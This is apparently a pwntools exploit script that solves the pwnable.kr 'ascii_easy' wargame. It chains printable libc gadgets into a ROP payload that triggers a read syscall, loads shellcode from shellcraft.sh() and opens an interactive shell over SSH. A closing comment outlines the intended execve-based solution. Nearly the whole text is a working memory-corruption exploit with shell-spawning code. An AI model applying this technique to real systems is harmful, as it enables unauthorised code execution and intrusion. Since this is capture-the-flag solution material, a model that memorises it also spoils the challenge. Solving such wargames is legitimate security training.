###ROP with printable gadgets

from pwn import *

###Addr
#  libc2.15
base = 0x5555e000
syscall = 0x00109177  # int 0x80
pop_many = 0x0001706b # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
inc_edx = 0x000e4d7a # inc edx ; xor eax, eax ; ret
xor_edx = 0x000e8367 # xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; pop ebp ; ret
inc_eax = 0x00097b7a # inc eax ; pop esi ; pop edi ; pop ebp ; ret
xor_ebx = 0x000d564b # xor ebx, ebp ; ret
pop_ecx = 0x00174a51 # pop ecx ; add al, 0xa ; ret
target = syscall+2

###Exploit
###The library is loaded mmapped addr 0x5555e000
###read/write/exec permission are given for the mmapped area
###find useful gadgets to construct read syscall
###and read further shellcode onto writable addr

s = ssh(host='pwnable.kr', port=2222,
        user='ascii_easy',
        password='guest')

padding = b'a'*0x20
ROPchain  = p32(base+pop_ecx)+p32(base+target)
ROPchain += p32(base+xor_edx)+p32(0x61616161)*4
ROPchain += p32(base+pop_many)+p32(0x61616161)*5
ROPchain += p32(base+xor_ebx)
ROPchain += p32(base+inc_edx)*0x20
ROPchain += (p32(base+inc_eax)+p32(0x61616161)*3)*3
ROPchain += p32(base+syscall)
ROPchain += p32(base+target)
payload = padding+ROPchain

r = s.process(['./ascii_easy',payload])

shellcode = asm(shellcraft.sh())

r.send(shellcode)
r.interactive(prompt='')


'''
official intended solution
1. jump to execve() at 0x5561676a
2. pass ebx to any string, and make symlink to that string
3. pass ecx, edx to NULL pointer.
4. get shell.
'''
